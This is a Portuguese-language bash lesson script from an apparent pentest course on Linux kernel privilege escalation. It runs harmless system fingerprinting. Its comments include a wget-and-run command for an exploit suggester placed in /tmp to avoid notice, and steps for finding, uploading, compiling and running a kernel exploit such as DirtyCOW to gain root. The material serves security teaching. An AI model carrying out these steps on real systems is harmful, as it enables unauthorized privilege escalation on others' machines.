#!/bin/bash
# ==============================================================================
# Módulo 4: Vulnerabilidades de Kernel
# Aula 01 - Identificar o Kernel e Busca de CVEs Locais
# ==============================================================================
#
# 1. ANALOGIA DO DIA A DIA
# Você invadiu um Prédio por uma falha numa Janela aberta (Webshell), mas você é 
# só um Faxineiro lá dentro (www-data). Não tem chave pra sala do Cofre (`/etc/shadow`).
# Então você repara que o próprio "Material de Concreto e as Pareces do Prédio"
# (O Kernel Linux) foram construídos por uma construtora que faliu em 2017 e deixou
# um buraco oculto estrutural embaixo de todos os carpetes. Se você pular 3x 
# seguidas no carpete com a força certa (Exploit Local), o chão desaba e você cai
# direto DENTRO do cofre do Andar de Baixo. Você nem precisou roubar chave, 
# a falha era da Fundação do prédio inteiro!
#
# 2. O QUE É (definição técnica Senior)
# Kernel Identifiers e CVEs (Common Vulnerabilities and Exposures) mapping.
# Uma invasão nunca é RCE + Puf virou root. É multistage.
# Ao obter uma shell de baixo privilégio, identificamos exatamente o Release `uname -a`.
# Diferentes kernels (ex 2.6.x a 4.4.x) possuem falhas publicas de gerenciamento de memória 
# (Page Faults, Race Conditions) que permitem a um programa burro do faxineiro invocar System Calls de ring0 
# e transbordar o EIP, retornando com um Shell "SUID Mágico" com poderes da maquina física raiz.
#
# ==============================================================================
# 3. SCRIPT / COMANDO COMENTADO
# ==============================================================================

# Defensivo/Informativo: Coleta Absoluta de Artefatos da Fundação do SO.
echo "[+] Extraindo Fingerprint de Sistema e Kernel Vivo:"

# `uname -a` (Gera OS, Nome na Rede, Release de kernel, Arquitetura (MUITO IMPORTANTE pra compilar exploit em C! se eh x64 ou arm ou i686 de 32 bits)).
echo -e "\n---> Uname:"
uname -a

# As vezes o Kernel está patcheado (seguro), mas a versão da Distribuição foi esquecida (Debian 7 antigo).
echo -e "\n---> Distribution Info:"
cat /etc/*release 2>/dev/null | grep PRETTY_NAME

# Como Hacker (Ofensivo): Usando o Linux Exploit Suggester (LES) em tempo real.
# É um Shell Script massivo que contem as assinaturas de todos os CVEs famosos 
# atrelados a tabelas de unames. Ele lê seu PC local e te dá uma lista de "Quais Exploits vão funcionar aqui hoje"

echo -e "\n[+] Executando o Sugestor De Exploits na Máquina Local (Simulando...):"
# Baixamos pra pasta tmp pra ngm ver no HD corporativo.
# cd /tmp/
# wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
# chmod +x les.sh
# ./les.sh

# ==============================================================================
# 4. PASSO A PASSO
# ==============================================================================
# Passo 1: Digite `uname -r`. Saiu `2.6.32-21-generic`.
# Passo 2: O numero MAIS IMPORTANTE p/ exploits de kernel é o final `-21-generic`. Porque versões `-22` tem patch!
# Passo 3: Vamos ao Kali e digitamos `searchsploit linux kernel 2.6.32 ubuntu`.
# Passo 4: O BD retorna "Half-Nelson" Privilege Escalation exploit em linguagem C.
# Passo 5: Mandamos o `exploit.c` pro `/tmp/` no servidor alvo via nossa shell fuleira, damos `gcc exploit.c -o exp`.
# Passo 6: Rodamos `./exp` e boom! Sai a cerquilha de root `#` piscando feliz.
#
# 5. VERIFICAÇÃO E TROUBLESHOOTING
# Problema: O exploit em `.c` requer compilação. Mas meu servidor invadido não possui o `gcc` instalado!
# Solução de CTF/Sênior: Você compila o código Na sua SUA máquina de Guerra Kali usando `gcc exploit.c -o exp -static`. A flag `-static` embute todas as bibliotecas na base do executável binário, que fica gigante (1mb). Então você viapera (upload) o binário pré-compilado Estático e apenas executa no server, dispensando o compilador falho la de origem.
# 
# 6. CONCEITO SENIOR (o "porquê" profundo)
# Existe um motivo pro Sênior recomendar Live-Patching corporativo (Canonical Livepatch ou KernelCare). Hackers leem o "Patch Management" mensal. Se o time de operações da AWS só reinicia servidores pra bootar kernel Novo (porque patching C sem reiniciar quebra tcp states) UMA vez a cada 6 meses, durante essa janela de 180 dias, os CVEs liberados na semana passada de kernel vão funcionar no Server que já tá com a ROM patchada no disco mas só bootará no mês q vem! A vulnerabilidade de Kernel de RCE Local Prowl é atrelada a RAM viva. `uname -r` acusa.
#
# 7. PERGUNTA DE ENTREVISTA / CTF
# Pergunta: "Seu LES (Suggester) rodou e avisou q o ALVO é vulnerável a DirtyCOW (CVE-2016-5195). Mas você tem muito medo de rodar e a máquina do cliente dar Kernel Panic de tela azul e crachar o ecommerce de 1 Mi BRL de produção em vez da shell, por instabilidade do exploit sujo da net. O que você olha PRIMEIRO pra ter certeza do crash mitigado?"
# Resposta Esperada: Exploits de Kernel não são limpos. Eles forçam race-conditions em Pthreads. O DirtyCOW mexe no Copy-On-Write da memória base. Pra eu ter certeza, compilaria o exploit na MINHA VM DE LAB idêntica em bits/OS à do Ecommerce. Boto o exploit rodar no VM. Se crachar de boas e der tela preta, meu exploit da internet foi mal escrito pro offset daquele host. Eu nunca testo PoC Github public kernel exploit em maquina produtiva de cliente as cegas (Responsabilidade Senior de Pentest "Do No Harm"). 
